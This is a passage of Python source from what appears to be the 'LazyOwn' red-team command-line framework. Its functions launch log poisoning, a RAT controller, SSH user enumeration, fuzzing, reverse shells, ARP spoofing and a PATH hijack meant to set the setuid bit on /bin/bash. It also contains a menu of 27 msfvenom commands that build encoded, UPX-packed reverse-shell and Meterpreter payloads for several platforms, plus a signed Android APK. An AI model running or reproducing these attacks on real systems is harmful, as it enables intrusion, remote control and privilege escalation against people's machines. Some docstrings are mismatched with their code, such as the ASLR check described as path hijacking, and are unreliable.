        Run the internal module located at `modules/lazylogpoisoning.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, specified in `self.params`.
        - `lhost`: The IP address of the local host, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rhost` and `lhost` from `self.params`.
        2. Checks if the required parameters `rhost` and `lhost` are assign. If not, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazylogpoisoning.py` script with the appropriate arguments.

        :param rhost: The IP address of the remote host. Must be assign in `self.params`.
        :type rhost: str
        :param lhost: The IP address of the local host. Must be assign in `self.params`.
        :type lhost: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost` and `lhost` are assign in `self.params`.
        2. The script `modules/lazylogpoisoning.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazylogpoisoning.py --rhost <rhost> --lhost <lhost>`

        Example:
            To run the lazylogpoisoning with `rhost` assign to `192.168.1.1` and `lhost` assign to `192.168.1.2`, set:
            `self.params["rhost"] = "192.168.1.1"`
            `self.params["lhost"] = "192.168.1.2"`
            Then call:
            `run_lazylogpoisoning()`

        Note:
            - Ensure that `modules/lazylogpoisoning.py` has the appropriate permissions and dependencies to run.
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]

        if not rhost or not lhost:
            print_error("rhost and lhost must be assign")
            return
        self.cmd(f"python3 modules/lazylogpoisoning.py --rhost {rhost} --lhost {lhost}")

    def run_lazybotcli(self):
        """
        Run the internal module located at `modules/lazybotcli.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host (default is `"0.0.0.0"`).
        - `rport`: The port number to be used, specified in `self.params`.
        - `rat_key`: The key for the Remote Access Tool (RAT), specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rport` and `rat_key` from `self.params`.
        2. Checks if the required parameters `rport` and `rat_key` are assign. If not, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazybotcli.py` script with the appropriate arguments.

        :param rport: The port number for the connection. Must be assign in `self.params`.
        :type rport: int
        :param rat_key: The key for the RAT. Must be assign in `self.params`.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `rport` and `rat_key` are assign in `self.params`.
        2. The script `modules/lazybotcli.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazybotcli.py --host 0.0.0.0 --port <rport> --key <rat_key>`

        Example:
            To run the lazybotcli with port `12345` and key `mysecretkey`, set:
            `self.params["rport"] = 12345`
            `self.params["rat_key"] = "mysecretkey"`
            Then call:
            `run_lazybotcli()`

        Note:
            - Ensure that `modules/lazybotcli.py` has the appropriate permissions and dependencies to run.
        """

        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be assign")
            return
        self.run_script(
            "modules/lazybotcli.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazyssh77enum(self):
        """
        Run the internal module located at `modules/lazybrutesshuserenum.py` with the specified parameters. ONLY valid for 7.x Version !!!

        The script will be executed with the following arguments:

        - `wordlist`: The path to the wordlist file containing potential usernames for SSH enumeration.
        - `rhost`: The target IP address or hostname for SSH enumeration.

        The function performs the following steps:

        1. Retrieves the values for `wordlist` and `rhost` from `self.params`.
        2. Prints a warning message about the potential inaccuracy of the results.
        3. Constructs the command to run the `lazybrutesshuserenum.sh` script with the specified arguments.
        4. Executes the command using the `os.system` method.

        :param wordlist: The path to the wordlist file for username enumeration. Must be assign in `self.params`.
        :type wordlist: str
        :param rhost: The target IP address or hostname for SSH enumeration. Must be assign in `self.params`.
        :type rhost: str

        :returns: None

        Manual execution:
        1. Ensure that `wordlist` and `rhost` are assign in `self.params`.
        2. Run the script `modules/lazybrutesshuserenum.sh` with the appropriate arguments.

        Dependencies:
        - `modules/lazybrutesshuserenum.sh` must be present in the `modules` directory and must be executable.

        Example:
            To run the SSH user enumeration with a wordlist located at `/path/to/wordlist.txt` and target IP `192.168.1.1`, set:
            `self.params["usrwordlist"] = "/path/to/wordlist.txt"`
            `self.params["rhost"] = "192.168.1.1"`
            Then call:
            `run_lazyssh77enum()`

        Note:
            - The accuracy of the results may vary depending on the version of the script and the wordlist used.
        """

        wordlist = self.params["usrwordlist"]
        rhost = self.params["rhost"]
        if not wordlist or not rhost:
            print_error("rhost and wordlist must be assign")
            return
        print_warn(
            "this may not be accurate. using a version a little bit updated from searchsploit"
        )
        path = os.getcwd()
        self.cmd(f"{path}/modules/lazybrutesshuserenum.sh {wordlist} {rhost}")

    def run_lazyburpfuzzer(self):
        """
        Run the internal module located at `modules/lazyown_burpfuzzer.py` with the specified parameters.

        The script will be executed with the following arguments:

        - `--url`: The target URL for the fuzzer.
        - `--method`: The HTTP method to use (e.g., GET, POST).
        - `--proxy_port`: The port for the proxy server.
        - `--headers`: Optional HTTP headers to include in the request.
        - `--data`: Optional data to include in the request body.
        - `--params`: Optional URL parameters to include in the request.
        - `--json_data`: Optional JSON data to include in the request body.
        - `-w`: Optional wordlist for fuzzing.
        - `-hc`: Optional hide code for fuzzing.

        The function performs the following steps:

        1. Retrieves the values for `url`, `method`, `headers`, `params`, `data`, `json_data`, `proxy_port`, `wordlist`, and `hide_code` from `self.params`.
        2. Constructs the command to run the `lazyown_burpfuzzer.py` script with the specified arguments.
        3. Adds optional parameters based on whether the corresponding files (`headers_file`, `data_file`, `params_file`, `json_data_file`) are provided.
        4. Executes the command using the `run_command` method.

        :param url: The target URL for the fuzzer. Must be assign in `self.params`.
        :type url: str
        :param method: The HTTP method to use. Must be assign in `self.params`.
        :type method: str
        :param headers: Optional HTTP headers. Must be assign in `self.params` or provided via `headers_file`.
        :type headers: str
        :param params: Optional URL parameters. Must be assign in `self.params` or provided via `params_file`.
        :type params: str
        :param data: Optional data for the request body. Must be assign in `self.params` or provided via `data_file`.
        :type data: str
        :param json_data: Optional JSON data for the request body. Must be assign in `self.params` or provided via `json_data_file`.
        :type json_data: str
        :param proxy_port: The port for the proxy server. Must be assign in `self.params`.
        :type proxy_port: int
        :param wordlist: Optional wordlist for fuzzing. Must be assign in `self.params`.
        :type wordlist: str
        :param hide_code: Optional code to hide. Must be assign in `self.params`.
        :type hide_code: int
        :param headers_file: Optional file containing headers.
        :type headers_file: str, optional
        :param data_file: Optional file containing data.
        :type data_file: str, optional
        :param params_file: Optional file containing parameters.
        :type params_file: str, optional
        :param json_data_file: Optional file containing JSON data.
        :type json_data_file: str, optional

        :returns: None

        Manual execution:
        1. Ensure that `url`, `method`, and `proxy_port` are assign in `self.params`.
        2. Provide additional parameters as needed.
        3. Run the script `modules/lazyown_burpfuzzer.py` with the appropriate arguments.

        Dependencies:
        - `modules/lazyown_burpfuzzer.py` must be present in the `modules` directory and must be executable.

        Example:
            To run the fuzzer with URL `http://example.com`, HTTP method `POST`, and proxy port `8080`, set:
            `self.params["url"] = "http://example.com"`
            `self.params["method"] = "POST"`
            `self.params["proxy_port"] = 8080`
            Then call:
            `run_lazyburpfuzzer()`

        Note:
            - Ensure that all required parameters are assign before calling this function.
            - Parameters can also be provided via corresponding files.
        """

        url = self.params["url"]
        method = self.params["method"]
        headers = self.params["headers"]
        params = self.params["params"]
        data = self.params["data"]
        json_data = self.params["json_data"]
        proxy_port = self.params["proxy_port"]
        wordlist = self.params["wordlist"]
        hide_code = self.params["hide_code"]
        headers_file = self.params.get("headers_file")
        data_file = self.params.get("data_file")
        params_file = self.params.get("params_file")
        json_data_file = self.params.get("json_data_file")

        command = [
            "python3",
            "modules/lazyown_bprfuzzer.py",
            "--url",
            url,
            "--method",
            method,
            "--proxy_port",
            str(proxy_port),
        ]

        if headers_file:
            command.extend(["--headers_file", headers_file])
        else:
            command.extend(["--headers", headers])

        if data_file:
            command.extend(["--data_file", data_file])
        else:
            command.extend(["--data", data])

        if params_file:
            command.extend(["--params_file", params_file])
        else:
            command.extend(["--params", params])

        if json_data_file:
            command.extend(["--json_data_file", json_data_file])
        else:
            command.extend(["--json_data", json_data])

        if wordlist:
            command.extend(["-w", wordlist])
        if hide_code:
            command.extend(["-hc", str(hide_code)])

        self.run_command(command)
        return

    def run_lazyreverse_shell(self):
        """
        Run the internal module located at `modules/lazyreverse_shell.sh` with the specified parameters.

        The script will be executed with the following arguments:
        - `--ip`: The IP address to use for the reverse shell.
        - `--puerto`: The port to use for the reverse shell.

        The function performs the following steps:

        1. Retrieves the values for `rhost` (IP address) and `reverse_shell_port` (port) from `self.params`.
        2. Validates that `rhost` and `reverse_shell_port` parameters are assign.
        3. Constructs the command to run the `lazyreverse_shell.sh` script with the specified arguments.
        4. Executes the command.

        :param ip: The IP address to use for the reverse shell. Must be assign in `self.params`.
        :type ip: str
        :param port: The port to use for the reverse shell. Must be assign in `self.params`.
        :type port: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost` and `reverse_shell_port` are assign in `self.params`.
        2. Run the script `modules/lazyreverse_shell.sh` with the appropriate arguments.

        Dependencies:
        - `modules/lazyreverse_shell.sh` must be present in the `modules` directory and must be executable.

        Example:
            To assign up a reverse shell with IP `192.168.1.100` and port `4444`, assign:
            `self.params["rhost"] = "192.168.1.100"`
            `self.params["reverse_shell_port"] = "4444"`
            Then call:
            `run_lazyreverse_shell()`

        Note:
            - Ensure that `modules/lazyreverse_shell.sh` has the necessary permissions to execute.
            - Parameters must be assign before calling this function.
        """

        ip = self.params["rhost"]
        port = self.params["reverse_shell_port"]
        path = os.getcwd()
        if not ip or not port:
            print_error(
                "rhost and reverse_shell_port must be assign, more info see, help assign"
            )
            return
        self.cmd(f"{path}/modules/lazyreverse_shell.sh --ip {ip} --puerto {port}")
        return

    def run_lazyarpspoofing(self):
        """
        Run the internal module located at `modules/lazyarpspoofing.py` with the specified parameters.

        The script will be executed with the following arguments:
        - `--device`: The network interface to use for ARP spoofing.
        - `lhost`: The local host IP address to spoof.
        - `rhost`: The remote host IP address to spoof.

        The function performs the following steps:

        1. Retrieves the values for `lhost`, `rhost`, and `device` from `self.params`.
        2. Validates that `lhost`, `rhost`, and `device` parameters are assign.
        3. Constructs the command to run the `lazyarpspoofing.py` script with the specified arguments.
        4. Executes the command.

        :param lhost: The local host IP address to spoof. Must be assign in `self.params`.
        :type lhost: str
        :param rhost: The remote host IP address to spoof. Must be assign in `self.params`.
        :type rhost: str
        :param device: The network interface to use for ARP spoofing. Must be assign in `self.params`.
        :type device: str

        :returns: None

        Manual execution:
        1. Ensure that `lhost`, `rhost`, and `device` are assign in `self.params`.
        2. Run the script `modules/lazyarpspoofing.py` with the appropriate arguments.

        Dependencies:
        - `modules/lazyarpspoofing.py` must be present in the `modules` directory and must be executable.

        Example:
            To execute ARP spoofing with local host `192.168.1.2`, remote host `192.168.1.1`, and device `eth0`, set:
            `self.params["lhost"] = "192.168.1.2"`
            `self.params["rhost"] = "192.168.1.1"`
            `self.params["device"] = "eth0"`
            Then call:
            `run_lazyarpspoofing()`

        Note:
            - Ensure that `modules/lazyarpspoofing.py` has the necessary permissions to execute.
            - Parameters must be assign before calling this function.
        """

        lhost = self.params["lhost"]
        rhost = self.params["rhost"]
        device = self.params["device"]
        if not lhost or not rhost or not device:
            print_error("lhost, lhost, and device must be assign")
            return
        self.cmd(f"modules/lazyarpspoofing.py --device {device} {lhost} {rhost}")
        return

    def run_lazyattack(self):
        """
        Run the internal module located at `modules/lazyatack.sh` with the specified parameters.

        The script will be executed with the following arguments:
        - `--modo`: The mode of the attack.
        - `--ip`: The target IP address.
        - `--atacante`: The attacker IP address.

        The function performs the following steps:

        1. Retrieves the current working directory.
        2. Validates that `mode`, `rhost`, and `lhost` parameters are assign.
        3. Constructs the command to run the `lazyatack.sh` script with the specified arguments.
        4. Executes the command.

        :param mode: The mode in which the attack should be run. Must be assign in `self.params`.
        :type mode: str
        :param target_ip: The IP address of the target. Must be assign in `self.params`.
        :type target_ip: str
        :param attacker_ip: The IP address of the attacker. Must be assign in `self.params`.
        :type attacker_ip: str

        :returns: None

        Manual execution:
        1. Ensure that `mode`, `rhost`, and `lhost` are assign in `self.params`.
        2. Run the script `modules/lazyatack.sh` with the appropriate arguments.

        Dependencies:
        - `modules/lazyatack.sh` must be present in the `modules` directory and must be executable.

        Example:
            To execute the attack with mode `scan`, target IP `192.168.1.100`, and attacker IP `192.168.1.1`, assign:
            `self.params["mode"] = "scan"`
            `self.params["rhost"] = "192.168.1.100"`
            `self.params["lhost"] = "192.168.1.1"`
            Then call:
            `run_lazyattack()`

        Note:
            - Ensure that `modules/lazyatack.sh` has the necessary permissions to execute.
            - Parameters must be assign before calling this function.
        """

        path = os.getcwd()
        mode = self.params["mode"]
        target_ip = self.params["rhost"]
        attacker_ip = self.params["lhost"]
        if not mode or not target_ip or not attacker_ip:
            print_error("mode, rhost, and lhost must be assign, more info see help assign")
            return
        self.cmd(
            f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}"
        )
        return

    def run_lazymsfvenom(self):
        """
        Executes the `msfvenom` tool to generate a variety of payloads based on user input.

        This function prompts the user to select a payload type from a predefined list and runs the corresponding
        `msfvenom` command to create the desired payload. It handles tasks such as generating different types of
        payloads for Linux, Windows, macOS, and Android systems, including optional encoding with Shikata Ga Nai for C payloads.

        The generated payloads are moved to a `sessions` directory, where appropriate permissions are assign. Additionally,
        the payloads can be compressed using UPX for space efficiency. If the selected payload is an Android APK,
        the function will also sign the APK and perform necessary post-processing steps.

        :param line: Command line arguments for the script.
        :return: None
        """

        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not lhost or not lport:
            print_error("lport and lhost must be assign")
            return

        # Prompt user for choice
        print_msg("Select payload type:")
        print_msg("1: linux/x86/meterpreter/reverse_tcp")
        print_msg("2: linux/x64/meterpreter/reverse_tcp")
        print_msg("3: windows/meterpreter/reverse_tcp")
        print_msg("4: windows/x64/meterpreter/reverse_tcp")
        print_msg("5: osx/x86/meterpreter/reverse_tcp")
        print_msg("6: osx/x64/meterpreter/reverse_tcp")
        print_msg("7: linux/x86/shell_reverse_tcp")
        print_msg("8: linux/x64/shell_reverse_tcp")
        print_msg("9: windows/shell_reverse_tcp")
        print_msg("10: windows/x64/shell_reverse_tcp")
        print_msg("11: osx/x86/shell_reverse_tcp")
        print_msg("12: osx/x64/shell_reverse_tcp")
        print_msg("13: linux/x86/meterpreter/reverse_tcp (C - shikata_ga_nai)")
        print_msg("14: windows/x64/meterpreter/reverse_tcp (C - shikata_ga_nai) 33 iteraciones")
        print_msg("15: android/meterpreter/reverse_tcp")
        print_msg("16: java/jsp_shell_reverse_tcp")
        print_msg("17: windows/meterpreter/reverse_tcp  (C - shikata_ga_nai)")
        print_msg("18: windows/x64/exec cmd='net user administrator P@s5w0rd123!'")
        print_msg("19: windows/shell_reverse_tcp python shellcode")
        print_msg("20: windows/x64/shell_reverse_tcp msi")
        print_msg("21: windows/meterpreter/reverse_tcp Powershell")
        print_msg("22: windows/meterpreter/reverse_tcp enc dll")
        print_msg("23: windows/shell_reverse_tcp HTA file")
        print_msg("24: windows/shell_reverse_tcp CSharp Shellcode")
        print_msg("25: windows/shell_reverse_tcp Perl Shellcode Windows")
        print_msg("26: linux/x64/shell_reverse_tcp Perl Shellcode Linux")
        print_msg("27: linux/x64/shell_reverse_tcp python shellcode")
        choice = input("Enter your choice (1-27): ").strip()

        # Define payload commands
        commands = {
            "1": f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf',
            "2": f'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf',
            "3": f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe',
            "4": f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe',
            "5": f'msfvenom -p osx/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho',
            "6": f'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho',
            "7": f'msfvenom -p linux/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf',
            "8": f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf',
            "9": f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe',
            "10": f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe',
            "11": f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho',
            "12": f'msfvenom -p osx/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho',
            "13": (
                f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} '
                '-b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > sessions/payload.c'
            ),
            "14": (
                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -x sessions/shell.exe -e x86/shikata_ga_nai -a x86 --platform windows -i 33 -k -f exe > shell_encoded.exe'
            ),
            "15": f'msfvenom -p android/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} > sessions/shell.apk ',
            "16": f'msfvenom -p java/jsp_shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -o sessions/shell.jsp ',
            "17": (
                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > sessions/payload.c'
            ),
            "18": (
                "msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll"
            ),
            "19": (
                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/shellcode_windows.py'
            ),
            "20": (
                f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f msi > sessions/shell64.msi'
            ),
            "21": (
                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f psh > sessions/Shell.ps1'
            ),
            "22": (
                f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT="{lport}" --encrypt rc4 --encrypt-key thisisakey -f dll > sessions/Shell.dll'
            ),
            "23": (
                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f hta-psh > sessions/index.hta'
            ),
            "24": (
                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f csharp > sessions/shellcode.cs'
            ),
            "25": (
                f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f perl > sessions/shellcode_windows.pl'
            ),
            "26": (
                f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" -f perl > sessions/shellcode_linux.pl'
            ),
            "27": (
                f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT="{lport}" EXITFUNC=thread -b "\\x00\\x0d\\x0a" -f python > sessions/shellcode_linux.py'
            )
        }
        if choice in commands:
            if choice == '14':
                self.cmd(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > sessions/shell.exe')
                print_warn("esperando payload shell.exe ")
                time.sleep(15)
                print_warn("codificando payload shell_encoded.exe ")
            self.cmd(commands[choice])
            self.cmd(f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f raw -o sessions/shellcode.bin')
            self.cmd(f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} PrependFork=true -o sessions/rev.bin')
            print_msg(f"Generated payload: {commands[choice]}")
            if choice == '15':
                self.cmd("sudo keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000")
                if not is_binary_present("jarsigner"):
                    print_warn("jarsigner is not present in the system, installing...")
                    self.cmd("sudo apt-get install openjdk-11-jdk-headless")
                self.cmd("sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore sessions/shell.apk emi")
                self.cmd("sudo jarsigner -verify -verbose -certs sessions/shell.apk")
                if not is_binary_present("zipalign"):
                    print_warn("zipalign is not presetn in the system, installing...")
                    self.cmd("sudo apt-get install zipalign")
                self.cmd("zipalign -v 4 sessions/shell.apk sessions/signed_shell.apk")

            if choice in commands:
                self.cmd("mkdir -p sessions")
                self.cmd("mv shell* sessions 2>/dev/null")
                self.cmd("mv da.dll sessions 2>/dev/null")
                self.cmd("chmod +x sessions/shell*")
            print_msg("Payloads moved to sessions/")
            if choice in ["1", "2", "7", "8"]:
                if os.path.exists("sessions/shell.elf"):
                    self.cmd("upx sessions/shell.elf")
                if os.path.exists("sessions/shell64.elf"):
                    self.cmd("upx sessions/shell64.elf")
            if choice in ["3", "4", "9", "10", "14","20"]:
                if os.path.exists("sessions/shell.exe"):
                    self.cmd("upx sessions/shell.exe")
                if os.path.exists("sessions/shell64.exe"):
                    self.cmd("upx sessions/shell64.exe")
                if os.path.exists("sessions/shell64_encoded.exe"):
                    self.cmd("upx sessions/shell64_encoded.exe")
                if os.path.exists("sessions/shell64.ms"):
                    self.cmd("upx sessions/shell64.ms")
            if choice in ["5", "6", "11", "12"]:
                if os.path.exists("sessions/shell.macho"):
                    self.cmd("upx sessions/shell.macho")
                if os.path.exists("sessions/shell64.macho"):
                    self.cmd("upx sessions/shell64.macho")
            if choice == "13":
                if os.path.exists("sessions/payload.c"):
                    print_msg("Payload in C generated: payload.c")
                    self.cmd(
                        f"echo 'curl http://{lhost}/payload.c -o payload.c' | xclip -sel clip"
                    )
                    print_msg(
                        f"To run web server exec command: curl http://{lhost}/payload.c -o payload.c copied to clipboard"
                    )

        else:
            print_error("Invalid choice. Please select a number between 1 and 26.")

    def run_lazyaslrcheck(self):
        """
        Creates a path hijacking attack by performing the following steps:

        1. Appends the value of `binary_name` to a temporary script located at `modules/tmp.sh`.
        2. Copies this temporary script to `/tmp` with the name specified by `binary_name`.
        3. Sets executable permissions on the copied script.
        4. Prepends `/tmp` to the system's PATH environment variable to ensure the script is executed in preference to other binaries.

        The function then prints out each command being executed and a message indicating the binary name used for the path hijacking.

        :param binary_name: The name of the binary to be used in the path hijacking attack. It should be assign in `self.params` before calling this method.
        :type binary_name: str

        :returns: None

        Manual execution:
        1. Ensure that `binary_name` is assign in `self.params`.
        2. Append the binary name to `modules/tmp.sh`.
        3. Copy `modules/tmp.sh` to `/tmp/{binary_name}`.
        4. assign executable permissions on the copied file.
        5. Update the PATH environment variable to prioritize `/tmp`.

        Dependencies:
        - The `self.params` dictionary must contain a valid `binary_name`.
        - Ensure that `modules/tmp.sh` exists and contains appropriate content for the attack.

        Example:
            To execute the path hijacking attack with `binary_name` as `malicious`, ensure `self.params["binary_name"]` is assign to `"malicious"`, and then call:
            `run_lazypathhijacking()`

        Note:
            - The `binary_name` parameter must be a string representing the name of the binary to hijack.
            - The method modifies the PATH environment variable, which may affect the execution of other binaries.
        """


        print_msg(
            f"{GREEN}Attemp to cat /proc/sys/kernel/randomize_va_space to ksnow if ASLR is active{RESET}"
        )
        result = subprocess.getoutput("cat /proc/sys/kernel/randomize_va_space")
        print_msg(result)
        if result == "0":
            print_error(f"    {GREEN}[+] ASLR is {RED}deactivated{RESET}")
        elif result == "1":
            print_warn(f"    {GREEN}[+] ASLR is partial {YELLOW}activated{RESET}")
        elif result == "2":
            print_msg(f"    {GREEN}[+] ASLR is activated{RESET}")
        return

    def run_lazypathhijacking(self):
        """
        Creates a path hijacking attack by performing the following steps:

        1. Appends the value of `binary_name` to a temporary script located at `modules/tmp.sh`.
        2. Copies this temporary script to `/tmp` with the name specified by `binary_name`.
        3. Sets executable permissions on the copied script.
        4. Prepends `/tmp` to the system's PATH environment variable to ensure the script is executed in preference to other binaries.

        The function then prints out each command being executed and a message indicating the binary name used for the path hijacking.

        :param binary_name: The name of the binary to be used in the path hijacking attack.
        :returns: None
        """

        binary_name = self.params["binary_name"]
        if not binary_name:
            print_msg("binary_name must be assign")
            return

        self.cmd(f"echo {binary_name} >> modules/tmp.sh")
        self.cmd(f"cp modules/tmp.sh /tmp/{binary_name}")
        self.cmd(f"chmod +x /tmp/{binary_name}")
        self.cmd("export PATH=/tmp:$PATH")

        print_msg(f"echo {binary_name} >> modules/tmp.sh")
        print_msg(f"cp modules/tmp.sh /tmp/{binary_name}")
        print_msg(f"chmod +x /tmp/{binary_name}")
        print_msg("export PATH=/tmp:$PATH")

        print_msg(
            f"Lazy path hijacking with binary_name: {binary_name} to assign u+s to /bin/bash"
        )
        return

    def run_script(self, script_name, *args):
        """Run a script with the given arguments

        This method constructs and executes a command to run a Python script with the specified arguments. It uses the `run_command` method to execute the script and handle real-time output.

        :param script_name: The name of the script to be executed.
        :type script_name: str
        :param args: The arguments to be passed to the script.
        :type args: tuple of str

        :returns: None

        Manual execution:
        1. Build the command list with "python3", the script name, and the arguments.
        2. Call `run_command` with the constructed command list.

        Dependencies:
        - `run_command` method for executing the constructed command and streaming output.

        Example:
            To execute a script named `example.py` with arguments `arg1` and `arg2`, call:
            `run_script("example.py", "arg1", "arg2")`

        Note:
            - The `script_name` parameter should be a string representing the name of the script.
            - The `args` parameter is a variable-length argument list containing the arguments to be passed to the script.
            - Ensure that the script and arguments are properly specified.
        """

        command = ["python3", script_name] + [str(arg) for arg in args]
        self.run_command(command)

    def run_command(self, command):
        """Run a command and print output in real-time

        This method executes a given command using `subprocess.Popen` and streams both the standard output and standard error to the console in real-time. The output from both streams is appended to the `self.output` attribute. If interrupted, the process is terminated gracefully.

        :param command: The command to be executed.
        :type command: str

        :returns: None

        Manual execution:
        1. Execute the command specified by the `command` parameter.
        2. Stream and print the command's standard output and error to the console in real-time.
        3. Append all output to the `self.output` attribute.
        4. Handle `KeyboardInterrupt` by terminating the process and printing an error message.

        Dependencies:
        - `subprocess` module for running the command and capturing output.
        - `print_msg` function for printing output to the console.
        - `print_error` function for printing error messages to the console.

        Example:
            To execute a command, call `run_command("ls -l")`.

        Note:
            - The `command` parameter should be a string representing the command to be executed.
            - `self.output` must be initialized before calling this method.
            - Ensure proper exception handling to manage process interruptions.
        """

        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        try:
            for line in iter(process.stdout.readline, ""):
                self.output += line
                print_msg(line)
            for line in iter(process.stderr.readline, ""):
                self.output += line
                print_msg(line)
            process.stdout.close()
            process.stderr.close()
            process.wait()
        except KeyboardInterrupt:
            process.terminate()
            process.wait()
            print_error("[Interrupted] Process terminated")

    @cmd2.with_category(miscellaneous_category)
    def do_payload(self, line):
        """Load parameters from a specified payload JSON file.

        This function loads parameters from a JSON file specified by the `line` argument and updates the instance's `params` dictionary with the values from the file. If the file does not exist or contains invalid JSON, it will print an appropriate error message.

        Usage:
            payload <filename>

        :param line: The name of the JSON file to load.
        :type line: str

        :returns: None

        Manual execution:
        1. Open and read the specified JSON file.
        2. Update the `params` dictionary with values from the JSON file.
        3. Print a success message if the parameters were successfully loaded.
        4. Handle `FileNotFoundError` if the file does not exist.
        5. Handle `JSONDecodeError` if there is an error decoding the JSON file.

        Dependencies:
        - `json` module for reading and parsing the JSON file.

        Example:
            To execute the function, call `payload payload_10.10.10.10.json`.

        Note:
            - Ensure that the specified JSON file exists in the current directory and is properly formatted.
            - The confirmation message includes color formatting for better visibility.
        """

        filename = line.strip() or "payload.json"

        try:
            with open(filename, "r") as f:
                data = json.load(f)
            for key, value in data.items():
                if key in self.params:
                    self.params[key] = value
            print_msg(f"Parameters loaded from {GREEN}{filename}{RESET}")
            self.onecmd("rrhost")
        except FileNotFoundError:
            print_error(f"{filename} not found")
        except json.JSONDecodeError:
            print_error(f"Error decoding {filename}")

    @cmd2.with_category(miscellaneous_category)
    def do_exit(self, arg):
        """Exit the command line interface.

        This function prompts the user to confirm whether they want to exit the command line interface. If confirmed, it will terminate the program. Otherwise, it will cancel the exit.

        Usage:
            exit

        :param arg: This parameter is not used in this function.
        :type arg: str

        :returns: None

        Manual execution:
        1. Prompt the user with a confirmation message to exit the CLI.
        2. If the user confirms with 's', print a message and exit the program.
        3. If the user provides any other input, print a cancellation message and remain in the CLI.

        Dependencies:
        - `sys.exit` function for exiting the program.

        Example:
            To execute the function, simply call `exit`.

        Note:
            - The confirmation prompt is in Spanish.
            - Ensure that `sys` is imported in your script.
        """


        confirm = (
            input(f"    [!] {YELLOW} Do you wanna exit? {GREEN}(s/n): {RESET}")
            .strip()
            .lower()
        )
        if confirm == "s":
            print_msg(f"{RED}GoodBy RedTeamer...{RESET}")
            sys.exit(0)
        else:
            print_warn(f"{RED}Exit canceled.{RESET}")
            return False
    @cmd2.with_category(miscellaneous_category)
    def do_fixperm(self, line):
        """Fix permissions for LazyOwn shell scripts.

        This function adjusts the file permissions for shell scripts and CGI scripts in the `modules` directory, making them executable.

        Usage:
            fixperm

        :param line: This parameter is not used in this function.
        :type line: str

        :returns: None

        Manual execution:
        1. Change the permissions of all shell scripts in the `modules` directory to be executable.
        2. Change the permissions of all files in the `modules/cgi-bin` directory to be executable.

        Dependencies:
        - `chmod` command must be available on the system.

        Example:
            To execute the function, simply call `fixperm`.

        Note:
            - Ensure you have the necessary permissions to modify file permissions.
        """

        print_msg("[F]ix script perm")
        self.cmd("chmod +x modules/*.sh")
        self.cmd("chmod +x modules/cgi-bin/*")
        return

    @cmd2.with_category(post_exploitation_category)
